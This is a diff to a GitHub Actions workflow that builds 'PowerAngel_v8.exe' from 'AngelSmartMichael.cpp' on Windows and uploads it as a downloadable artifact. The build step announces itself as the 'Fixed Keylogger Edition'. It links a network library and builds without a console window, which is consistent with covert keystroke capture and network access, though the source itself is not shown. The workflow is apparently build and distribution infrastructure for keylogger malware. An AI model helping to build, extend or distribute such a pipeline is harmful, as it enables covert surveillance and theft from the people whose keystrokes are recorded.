@@ -2,6 +2,12 @@ name: 🏗️ Build Power Angel v8.0
 
 on:
   push:
+    branches: [ main, master ]
+    paths:
+      - 'AngelSmartMichael.cpp'
+      - '.github/workflows/build.yml'
+  pull_request:
+    branches: [ main, master ]
     paths:
       - 'AngelSmartMichael.cpp'
 
@@ -10,21 +16,37 @@ jobs:
     runs-on: windows-latest
     
     steps:
-    - uses: actions/checkout@v4
-    
+    - name: Checkout code
+      uses: actions/checkout@v4
+      
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
       
-    - name: Compile
+    - name: Compile Power Angel v8.0
       shell: cmd
       run: |
-        echo Building Power Angel v8.0...
-        cl /EHsc /O2 /MT AngelSmartMichael.cpp /link /SUBSYSTEM:WINDOWS /OUT:PowerAngel_v8.exe user32.lib gdi32.lib advapi32.lib winhttp.lib gdiplus.lib shell32.lib comctl32.lib ole32.lib
-        if %ERRORLEVEL% NEQ 0 exit /b %ERRORLEVEL%
-        echo ✅ Compiled successfully!
+        echo Building Power Angel v8.0 - Fixed Keylogger Edition...
+        echo =============================================
         
-    - name: Upload
+        cl /EHsc /O2 /MT AngelSmartMichael.cpp ^
+           /link ^
+           /SUBSYSTEM:WINDOWS ^
+           /OUT:PowerAngel_v8.exe ^
+           user32.lib gdi32.lib advapi32.lib winhttp.lib ^
+           gdiplus.lib shell32.lib comctl32.lib ole32.lib oleaut32.lib
+        
+        if %ERRORLEVEL% NEQ 0 (
+          echo ❌ Compilation failed!
+          exit /b %ERRORLEVEL%
+        )
+        
+        echo.
+        echo ✅ PowerAngel_v8.exe created successfully!
+        dir PowerAngel_v8.exe
+        
+    - name: Upload executable
       uses: actions/upload-artifact@v4
       with:
-        name: PowerAngel_v8.0
+        name: 👼 PowerAngel-v8.0-Windows-x64
         path: PowerAngel_v8.exe
+        retention-days: 90
